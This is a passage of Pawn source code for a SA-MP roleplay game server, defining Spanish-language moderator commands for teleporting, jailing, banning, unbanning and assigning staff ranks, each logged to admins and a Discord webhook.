	GetPlayerPos(to_player, p[0], p[1], p[2]);
	GetPlayerFacingAngle(to_player, p[3]);

	SetPlayerPosEx(playerid, p[0], p[1], p[2], p[3], GetPlayerInterior(to_player), GetPlayerVirtualWorld(to_player), false, true);
	SetPlayerFacingAngle(playerid, p[3] + 180.0);

	SendCmdLogToAdmins(playerid, "goto", params);
	return 1;
}
alias:goto("ir")

CMD:gotopoint(playerid, params[])
{
	SetPlayerPosEx(playerid, PLAYER_TEMP[playerid][py_MAP_X], PLAYER_TEMP[playerid][py_MAP_Y], PLAYER_TEMP[playerid][py_MAP_Z], 0.0, GetPlayerInterior(playerid), GetPlayerVirtualWorld(playerid), false, true);
	SetPlayerPosFindZ(playerid, PLAYER_TEMP[playerid][py_MAP_X], PLAYER_TEMP[playerid][py_MAP_Y], PLAYER_TEMP[playerid][py_MAP_Z]);
	
	SendCmdLogToAdmins(playerid, "gotopoint", params);
	return 1;
}
flags:gotopoint(CMD_MODERATOR)

CMD:reportmute(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /reportmute <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "reportmute");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	PLAYER_MISC[to_player][MISC_REPORT_MUTE] = true;
	SavePlayerMisc(to_player);

	new str[145];
	format(str, 145, "[ADMIN] %s (%d) le bloque� los reportes a %s (%d)", ACCOUNT_INFO[playerid][ac_NAME], playerid, ACCOUNT_INFO[to_player][ac_NAME], to_player);
	SendMessageToAdmins(COLOR_ANTICHEAT, str);
	SendDiscordWebhook(str, 1);
	return 1;
}
flags:reportmute(CMD_MODERATOR2)

CMD:reportunmute(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /reportunmute <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "reportmute");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	PLAYER_MISC[to_player][MISC_REPORT_MUTE] = false;
	SavePlayerMisc(to_player);

	new str[145];
	format(str, 145, "[ADMIN] %s (%d) le desbloque� los reportes a %s (%d)", ACCOUNT_INFO[playerid][ac_NAME], playerid, ACCOUNT_INFO[to_player][ac_NAME], to_player);
	SendMessageToAdmins(COLOR_ANTICHEAT, str);
	SendDiscordWebhook(str, 1);
	return 1;
}
flags:reportunmute(CMD_MODERATOR2)

CMD:get(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /get <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "get");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	new Float:p[4];
	GetPlayerPos(playerid, p[0], p[1], p[2]);
	GetPlayerFacingAngle(playerid, p[3]);

	SetPlayerPosEx(to_player, p[0], p[1], p[2], GetPlayerInterior(playerid), GetPlayerVirtualWorld(playerid), false, true);
	SetPlayerFacingAngle(to_player, p[3] + 180.0);
	SetPlayerInterior(to_player, GetPlayerInterior(playerid));
	SetPlayerVirtualWorld(to_player, GetPlayerVirtualWorld(playerid));

	SendCmdLogToAdmins(playerid, "get", params);
	return 1;
}
alias:get("traer")

CMD:unban(playerid, params[])
{
	if ((gettime() - PLAYER_TEMP[playerid][py_ADMIN_DELAY]) < 10) return SendClientMessage(playerid, COLOR_WHITE, "Tienes que esperar 30 segundos para usar un comando de este tipo.");

	new name[24];
	if (sscanf(params, "s[24]", name)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /unban <nombre completo>");

	new DBResult:Result, DB_Query[128];
	format(DB_Query, sizeof DB_Query, "SELECT * FROM `BANS` WHERE `NAME` = '%q';", name);
	Result = db_query(Database, DB_Query);

	if (db_num_rows(Result))
	{
		format(DB_Query, sizeof DB_Query, "DELETE FROM `BANS` WHERE `NAME` = '%q';", name);
		db_free_result(db_query(Database, DB_Query));

		SendClientMessageEx(playerid, COLOR_WHITE, "El usuario '%s' ha sido desbaneado.", name);

		new str[145]; format(str, 145, "[ADMIN] %s (%d) ha desbaneado a '%s'.", ACCOUNT_INFO[playerid][ac_NAME], playerid, name);
		SendMessageToAdmins(COLOR_ANTICHEAT, str);

		new webhook[145];
		format(webhook, sizeof(webhook), ":page_with_curl: %s", str);
		SendDiscordWebhook(webhook, 1);
	}
	else SendClientMessageEx(playerid, COLOR_WHITE, "El nombre '%s' no est� en la lista de baneados.", name);
	db_free_result(Result);
	PLAYER_TEMP[playerid][py_ADMIN_DELAY] = gettime();
	return 1;
}

CMD:jail(playerid, params[])
{
    new to_player, reason[64], time;
    if (sscanf(params, "uds[64]", to_player, time, reason)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /jail <player_id> <minutos> <raz�n>");
	if (time < 0 || time > 1440) return SendClientMessage(playerid, COLOR_WHITE, "Intervalo de minutos incorrecto.");
    if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
    if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "jail");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	if(CHARACTER_INFO[to_player][ch_STATE] == ROLEPLAY_STATE_JAIL) return SendClientMessage(playerid, COLOR_WHITE, "Este jugador ya esta encarcelado.");
    StopAudioStreamForPlayer(to_player);
    CancelEdit(to_player);
    EndPlayerJob(to_player);

    PLAYER_MISC[to_player][MISC_JAILS] ++;
    SavePlayerMisc(to_player);

    PLAYER_TEMP[to_player][py_HUNGRY_MESSAGE] = false;
    PLAYER_TEMP[to_player][py_THIRST_MESSAGE] = false;
    PLAYER_TEMP[to_player][py_PLAYER_IN_ATM] = false;
    PLAYER_TEMP[to_player][py_PLAYER_IN_INV] = false;
    PLAYER_TEMP[to_player][py_CUFFED] = false;
    PLAYER_TEMP[to_player][py_CUFFING] = false;
    PLAYER_TEMP[to_player][py_PLAYER_WAITING_MP3_HTTP] = false;

    if (PLAYER_TEMP[to_player][py_PLAYER_IN_CALL]) EndPhoneCall(to_player);
    if (PLAYER_TEMP[to_player][py_GPS_MAP]) HidePlayerGpsMap(to_player);

    JailPlayer(to_player, time * 60);
    SetPlayerSpecialAction(to_player, SPECIAL_ACTION_NONE);

    new str[145];
    format(str, 145, "[ADMIN] %s (%d) jaile� a %s (%d) por %s minutos: %s.", ACCOUNT_INFO[playerid][ac_NAME], playerid, ACCOUNT_INFO[to_player][ac_NAME], to_player, TimeConvert(time * 60), reason);
    SendMessageToAdmins(COLOR_ANTICHEAT, str);

    new webhook[145]; format(webhook, sizeof(webhook), ":page_with_curl: %s", str);
	SendDiscordWebhook(webhook, 1);

    new dialog[250];
	format(dialog, sizeof dialog, ""COL_WHITE"%s te jaile�, raz�n: %s.\nRecuerde que a los 50 jails sera baneado permanentemente.", ACCOUNT_INFO[playerid][ac_NAME], reason);
	ShowPlayerDialog(to_player, DIALOG_INFO, DIALOG_STYLE_MSGBOX, ""COL_YELLOW"Aviso", dialog, "Entiendo", "");
    return 1;
}

CMD:ban(playerid, params[])
{
	if ((gettime() - PLAYER_TEMP[playerid][py_ADMIN_DELAY]) < 10) return SendClientMessage(playerid, COLOR_WHITE, "Tienes que esperar 30 segundos para usar un comando de este tipo.");

	new to_player, reason[32];
	if (sscanf(params, "us[32]", to_player, reason)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /ban <player_id> <razon>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "ban");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	if (PLAYER_TEMP[to_player][py_KICKED]) return SendClientMessage(playerid, COLOR_WHITE, "El jugador ya est� expulsado.");
	if (!ACCOUNT_INFO[to_player][ac_ID]) return KickEx(to_player, 100);

	AddPlayerBan(ACCOUNT_INFO[to_player][ac_ID], ACCOUNT_INFO[to_player][ac_NAME], ACCOUNT_INFO[to_player][ac_IP], ACCOUNT_INFO[playerid][ac_ID], TYPE_BAN, reason);

	new dialog[250];
	format(dialog, sizeof dialog, ""COL_WHITE"%s te bane�, raz�n: %s", ACCOUNT_INFO[playerid][ac_NAME], reason);
	ShowPlayerDialog(to_player, DIALOG_INFO, DIALOG_STYLE_MSGBOX, ""COL_YELLOW"Aviso", dialog, "Entiendo", "");
	KickEx(to_player, 500);
	PLAYER_MISC[to_player][MISC_BANS] ++;
	SavePlayerMisc(to_player);

	SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (nick: '%s' dbid: '%d', id: '%d') baneado.", ACCOUNT_INFO[to_player][ac_NAME], ACCOUNT_INFO[to_player][ac_ID], to_player);

	new str[145];
	format(str, 145, "[ADMIN] %s (%d) bane� a %s (%d): %s.", ACCOUNT_INFO[playerid][ac_NAME], playerid, ACCOUNT_INFO[to_player][ac_NAME], to_player, reason);
	SendMessageToAdmins(COLOR_ANTICHEAT, str);

	new webhook[145]; format(webhook, sizeof(webhook), ":page_with_curl: %s", str);
	SendDiscordWebhook(webhook, 1);

	new serial[41];
	gpci(to_player, serial, sizeof(serial));
	format(str, sizeof(str), "%s (%s): %s", ACCOUNT_INFO[to_player][ac_NAME], reason, serial);

	Log("cheaters_gpci", str);
	PLAYER_TEMP[playerid][py_ADMIN_DELAY] = gettime();
	return 1;
}

CMD:gpciban(playerid, params[])
{
	if (gettime() - PLAYER_TEMP[playerid][py_ADMIN_DELAY] < 30) return SendClientMessage(playerid, COLOR_WHITE, "Tienes que esperar 30 segundos para usar un comando de este tipo.");

	new to_player, reason[32];
	if (sscanf(params, "us[32]", to_player, reason)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /ban <player_id> <razon>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "gpciban");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	if (PLAYER_TEMP[to_player][py_KICKED]) return SendClientMessage(playerid, COLOR_WHITE, "El jugador ya est� expulsado.");
	if (!ACCOUNT_INFO[to_player][ac_ID]) return KickEx(to_player, 100);

	AddPlayerBan(ACCOUNT_INFO[to_player][ac_ID], ACCOUNT_INFO[to_player][ac_NAME], ACCOUNT_INFO[to_player][ac_IP], ACCOUNT_INFO[playerid][ac_ID], TYPE_BAN, reason, .account_gpci = ACCOUNT_INFO[to_player][ac_SERIAL]);

	new dialog[250];
	format(dialog, sizeof dialog, ""COL_WHITE"%s te bane�, raz�n: %s", ACCOUNT_INFO[playerid][ac_NAME], reason);
	ShowPlayerDialog(to_player, DIALOG_INFO, DIALOG_STYLE_MSGBOX, ""COL_YELLOW"Aviso", dialog, "Entiendo", "");
	KickEx(to_player, 500);
	PLAYER_MISC[to_player][MISC_BANS] ++;
	SavePlayerMisc(to_player);

	SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (nick: '%s' dbid: '%d', id: '%d') baneado.", ACCOUNT_INFO[to_player][ac_NAME], ACCOUNT_INFO[to_player][ac_ID], to_player);

	new str[145];
	format(str, 145, "[ADMIN] %s (%d) bane� a %s (%d): %s.", ACCOUNT_INFO[playerid][ac_NAME], playerid, ACCOUNT_INFO[to_player][ac_NAME], to_player, reason);
	SendMessageToAdmins(COLOR_ANTICHEAT, str);

	new webhook[145]; format(webhook, sizeof(webhook), ":page_with_curl: %s", str);
	SendDiscordWebhook(webhook, 1);

	format(str, sizeof(str), "%s (%s): %s", ACCOUNT_INFO[to_player][ac_NAME], reason, ACCOUNT_INFO[to_player][ac_SERIAL]);
	Log("cheaters_gpci", str);
	PLAYER_TEMP[playerid][py_ADMIN_DELAY] = gettime();

	return 1;
}
flags:gpciban(CMD_MODERATOR)

CMD:dgpciban(playerid, params[])
{
	if ((gettime() - PLAYER_TEMP[playerid][py_ADMIN_DELAY]) < 10) return SendClientMessage(playerid, COLOR_WHITE, "Tienes que esperar 30 segundos para usar un comando de este tipo.");

	new reason[32], to_account;
	if (sscanf(params, "ds[32]", to_account, reason)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /dban <DB-ID> <razon>");

	new DBResult:Result, DB_Query[160];
	format(DB_Query, sizeof DB_Query, "SELECT `ID`, `IP`, `GPCI`, `NAME`, `CONNECTED`, `PLAYERID`, `ADMIN_LEVEL` FROM `ACCOUNTS` WHERE `ID` = %d;", to_account);
	Result = db_query(Database, DB_Query);

	if (db_num_rows(Result))
	{
		new id, ip[16], get_name[24], serial[50], connected, player_id, admin_level;

		id = db_get_field_assoc_int(Result, "ID");
		db_get_field_assoc(Result, "IP", ip, 16);
		db_get_field_assoc(Result, "NAME", get_name, 24);
		db_get_field_assoc(Result, "GPCI", serial, 50);
		connected = db_get_field_assoc_int(Result, "CONNECTED");
		player_id = db_get_field_assoc_int(Result, "PLAYERID");
		admin_level = db_get_field_assoc_int(Result, "ADMIN_LEVEL");

		if (ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] > admin_level)
		{
			if (connected) SendClientMessageEx(playerid, COLOR_WHITE, "JUGADOR '%s' DB-ID '%d' conectado utilice /ban, su player_id: %d.", get_name, id, player_id);
			else
			{
				new DBResult:is_banned;
				format(DB_Query, sizeof DB_Query, "SELECT * FROM `BANS` WHERE `NAME` = '%q' OR `IP` = '%q' OR `GPCI` = '%q';", get_name, ip, serial);
				is_banned = db_query(Database, DB_Query);

				if (db_num_rows(is_banned))
				{
					new expire_date[24];
					db_get_field_assoc(is_banned, "EXPIRE_DATE", expire_date, 24);

					if (!strcmp(expire_date, "0", false)) SendClientMessageEx(playerid, COLOR_WHITE, "JUGADOR (Nombre: '%s' DB-ID: '%d') ya est� baneado (permanentemente).", get_name, id);
					else SendClientMessageEx(playerid, COLOR_WHITE, "JUGADOR (Nombre: '%s' DB-ID: '%d') ya est� baneado (temporalmente, fecha de readmisi�n: %s).", get_name, id, expire_date);
				}
				else
				{
					AddPlayerBan(id, get_name, ip, ACCOUNT_INFO[playerid][ac_ID], TYPE_BAN, reason, .account_gpci = serial);
					SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (nick: '%s' db_id: '%d') baneado.", get_name, id);

					new str[145]; format(str, 145, "[ADMIN] %s (%d) bane� a %s por serial (offline, db_id: %d): %s", ACCOUNT_INFO[playerid][ac_NAME], playerid, get_name, id, reason);
					SendMessageToAdmins(COLOR_ANTICHEAT, str);

					new webhook[145]; format(webhook, sizeof(webhook), ":page_with_curl: %s", str);
					SendDiscordWebhook(webhook, 1);
				}

				db_free_result(is_banned);
			}
		}
		else SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
	}
	else SendClientMessage(playerid, COLOR_WHITE, "No se encontro la DB-ID.");
	db_free_result(Result);

	PLAYER_TEMP[playerid][py_ADMIN_DELAY] = gettime();
	return 1;
}
flags:dgpciban(CMD_MODERATOR)

CMD:cls(playerid, params[])
{
	for(new i = 0; i != 40; i ++) SendClientMessageToAll(-1, " ");

	SendCmdLogToAdmins(playerid, "clear", params);
	return 1;
}
alias:cls("log", "clear")

CMD:tban(playerid, params[])
{
	if ((gettime() - PLAYER_TEMP[playerid][py_ADMIN_DELAY]) < 10) return SendClientMessage(playerid, COLOR_WHITE, "Tienes que esperar 30 segundos para usar un comando de este tipo.");

	new to_player, days, reason[32];
	if (sscanf(params, "uds[32]", to_player, days, reason)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /tban <player_id> <dias> <razon>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "tban");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	if (days <= 0 || days > 9999) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /ban <player_id> <dias> <razon>");

	if (PLAYER_TEMP[to_player][py_KICKED]) return SendClientMessage(playerid, COLOR_WHITE, "El jugador ya est� expulsado.");
	if (!ACCOUNT_INFO[to_player][ac_ID]) return KickEx(to_player, 100);

	AddPlayerBan(ACCOUNT_INFO[to_player][ac_ID], ACCOUNT_INFO[to_player][ac_NAME], ACCOUNT_INFO[to_player][ac_IP], ACCOUNT_INFO[playerid][ac_ID], TYPE_TEMP_BAN, reason, days);

	new dialog[250];
	format(dialog, sizeof dialog, ""COL_WHITE"%s te bane� por %d d�as, raz�n: %s", ACCOUNT_INFO[playerid][ac_NAME], days, reason);
	ShowPlayerDialog(to_player, DIALOG_INFO, DIALOG_STYLE_MSGBOX, ""COL_YELLOW"Aviso", dialog, "Entiendo", "");
	KickEx(to_player, 500);
	PLAYER_MISC[to_player][MISC_BANS] ++;
	SavePlayerMisc(to_player);

	SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (nick: '%s' dbid: '%d', pid: '%d') baneado por %d d�as.", ACCOUNT_INFO[to_player][ac_NAME], ACCOUNT_INFO[to_player][ac_ID], to_player, days);

	new str[145]; format(str, 145, "[ADMIN] %s (%d) bane� %d d�as a %s (%d): %s", ACCOUNT_INFO[playerid][ac_NAME], playerid, days, ACCOUNT_INFO[to_player][ac_NAME], to_player, reason);
	SendMessageToAdmins(COLOR_ANTICHEAT, str);

	new webhook[145]; format(webhook, sizeof(webhook), ":page_with_curl: %s", str);
	SendDiscordWebhook(webhook, 1);

	new serial[41];
	gpci(to_player, serial, sizeof(serial));
	format(str, sizeof(str), "%s (%s): %s", ACCOUNT_INFO[to_player][ac_NAME], reason, serial);

	Log("cheaters_gpci", str);
	PLAYER_TEMP[playerid][py_ADMIN_DELAY] = gettime();
	return 1;
}

CMD:dban(playerid, params[])
{
	if ((gettime() - PLAYER_TEMP[playerid][py_ADMIN_DELAY]) < 10) return SendClientMessage(playerid, COLOR_WHITE, "Tienes que esperar 30 segundos para usar un comando de este tipo.");

	new reason[32], to_account;
	if (sscanf(params, "ds[32]", to_account, reason)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /dban <DB-ID> <razon>");

	new DBResult:Result, DB_Query[160];
	format(DB_Query, sizeof DB_Query, "SELECT `ID`, `IP`, `NAME`, `CONNECTED`, `PLAYERID`, `ADMIN_LEVEL` FROM `ACCOUNTS` WHERE `ID` = '%d';", to_account);
	Result = db_query(Database, DB_Query);

	if (db_num_rows(Result))
	{
		new id, ip[16], get_name[24], connected, player_id, admin_level;

		id = db_get_field_assoc_int(Result, "ID");
		db_get_field_assoc(Result, "IP", ip, 16);
		db_get_field_assoc(Result, "NAME", get_name, 24);
		connected = db_get_field_assoc_int(Result, "CONNECTED");
		player_id = db_get_field_assoc_int(Result, "PLAYERID");
		admin_level = db_get_field_assoc_int(Result, "ADMIN_LEVEL");

		if (ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] > admin_level)
		{
			if (connected) SendClientMessageEx(playerid, COLOR_WHITE, "JUGADOR '%s' DB-ID '%d' conectado utilice /ban, su player_id: %d.", get_name, id, player_id);
			else
			{
				new DBResult:is_banned;
				format(DB_Query, sizeof DB_Query, "SELECT * FROM `BANS` WHERE `NAME` = '%q' OR `IP` = '%q';", get_name, ip);
				is_banned = db_query(Database, DB_Query);

				if (db_num_rows(is_banned))
				{
					new expire_date[24];
					db_get_field_assoc(is_banned, "EXPIRE_DATE", expire_date, 24);

					if (!strcmp(expire_date, "0", false)) SendClientMessageEx(playerid, COLOR_WHITE, "JUGADOR (Nombre: '%s' DB-ID: '%d') ya est� baneado (permanentemente).", get_name, id);
					else SendClientMessageEx(playerid, COLOR_WHITE, "JUGADOR (Nombre: '%s' DB-ID: '%d') ya est� baneado (temporalmente, fecha de readmisi�n: %s).", get_name, id, expire_date);
				}
				else
				{
					AddPlayerBan(id, get_name, ip, ACCOUNT_INFO[playerid][ac_ID], TYPE_BAN, reason);
					SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (nick: '%s' db_id: '%d') baneado.", get_name, id);

					new str[145]; format(str, 145, "[ADMIN] %s (%d) bane� a %s (offline, db_id: %d): %s", ACCOUNT_INFO[playerid][ac_NAME], playerid, get_name, id, reason);
					SendMessageToAdmins(COLOR_ANTICHEAT, str);

					new webhook[145]; format(webhook, sizeof(webhook), ":page_with_curl: %s", str);
					SendDiscordWebhook(webhook, 1);
				}

				db_free_result(is_banned);
			}
		}
		else SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
	}
	else SendClientMessage(playerid, COLOR_WHITE, "No se encontro la DB-ID.");
	db_free_result(Result);

	PLAYER_TEMP[playerid][py_ADMIN_DELAY] = gettime();
	return 1;
}

CMD:dtban(playerid, params[])
{
	if ((gettime() - PLAYER_TEMP[playerid][py_ADMIN_DELAY]) < 10) return SendClientMessage(playerid, COLOR_WHITE, "Tienes que esperar 30 segundos para usar un comando de este tipo.");

	new reason[32], to_account, days;
	if (sscanf(params, "dds[32]", to_account, days, reason)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /dtban <DB-ID> <dias> <razon>");
	if (days <= 0 || days > 9999) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /dtban <DB-ID> <dias> <razon>");

	new DBResult:Result, DB_Query[160];
	format(DB_Query, sizeof DB_Query, "SELECT `ID`, `IP`, `NAME`, `CONNECTED`, `PLAYERID`, `ADMIN_LEVEL` FROM `ACCOUNTS` WHERE `ID` = '%d';", to_account);
	Result = db_query(Database, DB_Query);

	if (db_num_rows(Result))
	{
		new id, ip[16], get_name[24], connected, player_id, admin_level;

		id = db_get_field_assoc_int(Result, "ID");
		db_get_field_assoc(Result, "IP", ip, 16);
		db_get_field_assoc(Result, "NAME", get_name, 24);
		connected = db_get_field_assoc_int(Result, "CONNECTED");
		player_id = db_get_field_assoc_int(Result, "PLAYERID");
		admin_level = db_get_field_assoc_int(Result, "ADMIN_LEVEL");

		if (ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] > admin_level)
		{
			if (connected) SendClientMessageEx(playerid, COLOR_WHITE, "JUGADOR '%s' DB-ID '%d' conectado utilice /ban, su player_id: %d.", get_name, id, player_id);
			else
			{
				new DBResult:is_banned;
				format(DB_Query, sizeof DB_Query, "SELECT * FROM `BANS` WHERE `NAME` = '%q' OR `IP` = '%q';", get_name, ip);
				is_banned = db_query(Database, DB_Query);

				if (db_num_rows(is_banned))
				{
					new expire_date[24];
					db_get_field_assoc(is_banned, "EXPIRE_DATE", expire_date, 24);

					if (!strcmp(expire_date, "0", false)) SendClientMessageEx(playerid, COLOR_WHITE, "JUGADOR (Nombre: '%s' DB-ID: '%d') ya est� baneado (permanentemente).", get_name, id);
					else SendClientMessageEx(playerid, COLOR_WHITE, "JUGADOR (Nombre: '%s' DB-ID: '%d') ya est� baneado (temporalmente, fecha de readmisi�n: %s).", get_name, id, expire_date);
				}
				else
				{
					AddPlayerBan(id, get_name, ip, ACCOUNT_INFO[playerid][ac_ID], TYPE_TEMP_BAN, reason, days);
					SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (nick: '%s' dbid: '%d') baneado por %d d�as.", get_name, id, days);

					new str[145]; format(str, 145, "[ADMIN] %s (%d) bane� %d d�as a %s (offline, db_id: %d): %s", ACCOUNT_INFO[playerid][ac_NAME], playerid, days, get_name, id, reason);
					SendMessageToAdmins(COLOR_ANTICHEAT, str);

					new webhook[145]; format(webhook, sizeof(webhook), ":page_with_curl: %s", str);
					SendDiscordWebhook(webhook, 1);
				}

				db_free_result(is_banned);
			}
		}
		else SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
	}
	else SendClientMessage(playerid, COLOR_WHITE, "No se encontro la DB-ID.");
	db_free_result(Result);

	PLAYER_TEMP[playerid][py_ADMIN_DELAY] = gettime();
	return 1;
}

CMD:rac(playerid, params[])
{
	RespawnGlobalUnoccupiedVehicles();
	SendClientMessage(playerid, COLOR_WHITE, "Todos los veh�culos no personales y sin ocupar han sido re-spawneados.");

	SendCmdLogToAdmins(playerid, "rac", params);
	return 1;
}

CMD:rac2(playerid, params[])
{
	RespawnAllUnoccupiedVehicles();
	SendClientMessage(playerid, COLOR_WHITE, "Todos los veh�culos sin ocupar han sido re-spawneados.");

	SendCmdLogToAdmins(playerid, "rac2", params);
	return 1;
}

CMD:rv(playerid, params[])
{
	new vehicleid = GetPlayerVehicleID(playerid);
	if (!vehicleid) return SendClientMessage(playerid, COLOR_WHITE, "No est�s en un veh�culo.");

	SetVehicleToRespawnEx(vehicleid);
	SendClientMessageEx(playerid, COLOR_WHITE, "Veh�culo (%d) re-spawneado.", vehicleid);
	return 1;
}

CMD:pm(playerid, params[])
{
	new to_player, message[128];
	if (sscanf(params, "us[128]", to_player, message)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /pm <player_id> <mensaje>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);

	SendClientMessageEx(playerid, COLOR_WHITE, "{5CCE3D}>"COL_WHITE" Mensaje enviado a %s (%d): %s", ACCOUNT_INFO[to_player][ac_NAME], to_player, message);

	PLAYER_TEMP[to_player][py_ADMIN_PM_PID] = playerid;
	PLAYER_TEMP[to_player][py_ADMIN_PM_AID] = ACCOUNT_INFO[playerid][ac_ID];
	PLAYER_TEMP[to_player][py_ADMIN_PM_TIME] = gettime();
	SendClientMessageEx(to_player, COLOR_WHITE, "{5CCE3D}>"COL_WHITE" Mensaje de un administrador (/r para responder): "COL_WHITE"%s", message);

	SendCmdLogToAdmins(playerid, "pm", params);
	return 1;
}

CMD:atenderre(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /atenderre <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);

	SendClientMessageEx(to_player, COLOR_WHITE, "{5CCE3D}>"COL_WHITE" Un moderador esta atendiendo tu reporte.");

	SendCmdLogToAdmins(playerid, "atenderre", params);
	return 1;
}

CMD:darstaff(playerid, params[])
{
	new to_player, level;
	if (sscanf(params, "ud", to_player, level)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /givemod <player_id> <rango>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "givemod");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}
	if (level < 0 || level >= sizeof ADMIN_LEVELS) return SendClientMessage(playerid, COLOR_WHITE, "El rango no es v�lido.");
	if (level > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL]) return SendClientMessage(playerid, COLOR_WHITE, "No puedes dar este rango por ser un rango superior al tuyo.");

	new DB_Query[70];
	format(DB_Query, sizeof DB_Query, "UPDATE `ACCOUNTS` SET `ADMIN_LEVEL` = '%d' WHERE `ID` = '%d';", level, ACCOUNT_INFO[to_player][ac_ID]);
	db_free_result(db_query(Database, DB_Query));

	ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] = level;
	SendClientMessageEx(to_player, COLOR_WHITE, "%s cambi� tu rango administrativo a: %s.", ACCOUNT_INFO[playerid][ac_NAME], ADMIN_LEVELS[level]);
	SendClientMessageEx(playerid, COLOR_WHITE, "El rango administrativo de %s (%d) ahora es %s.", ACCOUNT_INFO[to_player][ac_NAME], to_player, ADMIN_LEVELS[level]);

	new str_text[64];
	format(str_text, sizeof(str_text), "MOD~n~~w~%d", level);
	ShowPlayerAlert(to_player, str_text, 0x6AEA5BFF, 4);

	SendCmdLogToAdmins(playerid, "givemod", params);
	return 1;
}
alias:darstaff("givemod")

CMD:ac(playerid, params[])
{
	ShowDialog(playerid, DIALOG_ANTI_CHEAT);
	return 1;
}

CMD:setthirst(playerid, params[])
{
	new to_player, Float:ammount;
